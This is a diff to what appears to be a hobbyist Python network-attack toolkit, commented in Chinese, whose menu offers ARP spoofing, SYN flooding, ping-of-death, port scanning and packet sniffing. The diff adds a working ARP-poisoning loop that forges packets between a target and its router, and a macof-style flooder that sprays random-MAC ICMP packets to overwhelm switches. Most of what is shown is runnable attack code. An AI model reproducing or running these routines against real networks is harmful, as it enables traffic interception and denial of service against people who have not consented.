@@ -30,15 +30,33 @@ mac = ":".join([mac[e:e+2] for e in range(0,11,2)])
 print(mac)
 
 file = open("color.setting",'r')#让用户可以选择程序运行时的颜色
-color = file.read()
-os.system("color " + color)
+color = file.read()#读取文件
+os.system("color " + color)#用os.system()改变颜色
 
-def ARP_poof(): #ARP欺骗带ARPPing(内网用)。
+def ARP_poof_with_not_ARPping():#ARP欺骗不带ARPPing
+    
     target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
     router = input("Please enter the router IP address like 192.168.1.1:")
-    arp_Ping_fall = False
+
+    packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
+    packet_two = Ether()/ARP(psrc=target,pdst=router)
+
+    while True:#攻击主循环
+        try:
+            sendp(packet)
+            sendp(packet_two)
+        except KeyboardInterrupt:
+            break
+
+def ARP_poof(): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机是否存活
+
+    target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
+    router = input("Please enter the router IP address like 192.168.1.1:")
+
+    arp_Ping_fall = False#初始化变量
     arp_test = False
     arp_test_two = False
+
     print("Try to arpPing the target...")
     ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=target),timeout=1000)#ARPPing(arp目标扫描) PS:不知道为什么有时会失效。
     for snd,rcv in ans:
@@ -66,7 +84,6 @@ def ARP_poof(): #ARP欺骗带ARPPing(内网用)。
                 break
             sendp(packet)
             sendp(packet_two)
-            print(packet.show())
         except KeyboardInterrupt:
             break
 
@@ -85,9 +102,9 @@ def nmap_port_scan():#nmap扫描所有端口状态
     target = input("Enter the target IP like 127.0.0.1:")
     nm = nmap.PortScanner()
     nm.scan(target, '1-9999')
-    for host in nm.all_hosts():
+    for host in nm.all_hosts():#在nmap的扫描结果里的所有主机进行分析
         print('-----------------------------------')
-        print('Host:%s(%s)'%(host,nm[host].hostname()))
+        print('Host:%s(%s)'%(host,nm[host].hostname()))#打印计算机名称
         print('State:%s'%nm[host].state())
         for proto in nm[host].all_protocols():
             print('-----------------------------------')
@@ -116,21 +133,34 @@ def scapy_sniff():
     writer.close()
 
 def read_pcap():
-    file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")
-    file_name = "sniff_data/" + file_name
-    reader = PcapReader(file_name)
-    packets = reader.read_all(-1)
-    for i in packets:
-        i.show()
+
+    file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")#输入pcap文件名
+    file_name = "sniff_data/" + file_name#组合文件路径
+    reader = PcapReader(file_name)#用scapy打开pcap文件
+    packets = reader.read_all(-1)#读取所有储存的数据包
+    for i in packets:#循环数据包列表
+        i.show()#打印数据包
+
+def macof():
+    while True:
+        try:
+            packet = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
+            time.sleep(0.01)
+            sendp(packet)
+        except KeyboardInterrupt:
+            break
 
 while True:#喜闻乐见的主循环
-    print("quit(0)")
+
+    print("quit(0)")#告诉用户对应的功能
     print("ARPspoof with ARPPing.(1)")
     print("SYN flood(2)")
     print("All port status scans(3)")
     print("Death of Ping(4)")
     print("Sniff(5)")
     print("Read Save pcap file(6)")
+    print("ARPspoof with not ARPPing(7)")
+    print("macof(8)")
     print("退出(0)")
     print("ARP欺骗带ARPPing(内网用)。(1)")
     print("SYN洪水(2)")
@@ -138,18 +168,21 @@ while True:#喜闻乐见的主循环
     print("死亡之Ping(4)")
     print("sniff嗅探(5)")
     print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
+    print("ARP欺骗不带ARPPing版(7)")
+    print("伪macof(8)")
 
     choose = input(">>>")#用户选择输入
-    try:
-        choose = int(choose)
-    except:
+
+    try:#判断用户输入的是否是数字
+        choose = int(choose)#用int函数强转数字
+    except:#如果不是就告诉用户必须输入数字
         print("Must enter int")
 
     if choose == 0:#无聊的判断时间 PS:这里想吐槽python没有什么关键字你知道了把。
         sys.exit(0)
     elif choose == 1:#时刻提醒自己要两的等于号。
         ARP_poof()
-    elif choose == 2:
+    elif choose == 2:#没一个选择对应一个函数
         SYN_flood()
     elif choose == 3:
         nmap_port_scan()
@@ -159,3 +192,9 @@ while True:#喜闻乐见的主循环
         scapy_sniff()
     elif choose == 6:
         read_pcap()
+    elif choose == 7:
+        ARP_poof_with_not_ARPping()
+    elif choose == 8:
+        macof()
+    else:#如果输入无效就告诉用户输入无效
+        print("Don't have this choose")
